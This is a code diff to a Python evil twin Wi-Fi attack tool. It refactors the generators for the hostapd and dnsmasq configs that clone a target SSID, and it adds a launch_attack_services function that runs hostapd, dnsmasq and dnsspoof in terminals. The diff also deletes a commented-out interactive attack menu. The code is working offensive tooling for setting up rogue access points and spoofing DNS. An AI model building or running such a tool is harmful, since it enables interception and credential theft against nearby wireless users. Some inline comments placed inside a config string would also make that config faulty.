@@ -2,8 +2,8 @@
 import subprocess
 import os
 
-def create_hostapd_config(interface, ssid, channel):
-    config_path = os.path.join(os.getcwd(), "hostapd.conf")
+def create_hostapd_config(interface, ssid, channel, config_dir):
+    config_path = os.path.join(config_dir, "hostapd.conf")
     config_content = f"""interface={interface}
 driver=nl80211
 ssid={ssid}
@@ -22,9 +22,9 @@ ignore_broadcast_ssid=0
         return None
 
 
-def create_dnsmasq_config(interface_name):
-    config_path = os.path.join(os.getcwd(), "dnsmasq.conf")
-    config_content = f"""interface={interface_name}
+def create_dnsmasq_config(interface, config_dir):  # Changed parameter name
+    config_path = os.path.join(config_dir, "dnsmasq.conf")
+    config_content = f"""interface={interface}  # Now using correct parameter name
 dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
 dhcp-option=3,192.168.1.1
 dhcp-option=6,192.168.1.1
@@ -64,6 +64,15 @@ def setup_fake_ap_network(interface='wlan0'):
     run_command("echo 1 | tee /proc/sys/net/ipv4/ip_forward")
 
 
+def launch_attack_services(interface, hostapd_conf, dnsmasq_conf):
+    cmds = [
+        f"hostapd {hostapd_conf}",
+        f"dnsmasq -C {dnsmasq_conf} -d",
+        f"dnsspoof -i {interface}"
+    ]
+    for cmd in cmds:
+        open_terminal_with_command(cmd)
+
 def open_terminal_with_command(cmd):
     try:
         subprocess.Popen(['gnome-terminal', '--', 'bash', '-c', f'{cmd}; exec bash'])
@@ -72,27 +81,3 @@ def open_terminal_with_command(cmd):
         print(f"[!] Failed to launch command: {cmd} - {e}")
 
 
-# def evil_twin_menu():
-#     from utils.network_utils import set_managed_mode
-#     global interface
-#     print("\n" + "="*40)
-#     print("Evil Twin Attack")
-#     print("="*40)
-#     # ensure interface in managed/AP mode
-#     set_managed_mode(interface)
-#     ssid = input("Enter SSID to clone: ").strip()
-#     channel = input("Enter channel number: ").strip()
-#     # create config files
-#     hostapd_conf = create_hostapd_config(interface, ssid, channel)
-#     dnsmasq_conf = create_dnsmasq_config(interface)
-#     if hostapd_conf and dnsmasq_conf:
-#         setup_fake_ap_network(interface)
-#         commands = [
-#             f"hostapd {hostapd_conf}",
-#             f"dnsmasq -C {dnsmasq_conf} -d",
-#             f"dnsspoof -i {interface}"
-#         ]
-#         for cmd in commands:
-#             open_terminal_with_command(cmd)
-#     else:
-#         print("[-] Failed to create required config files. Exiting.")
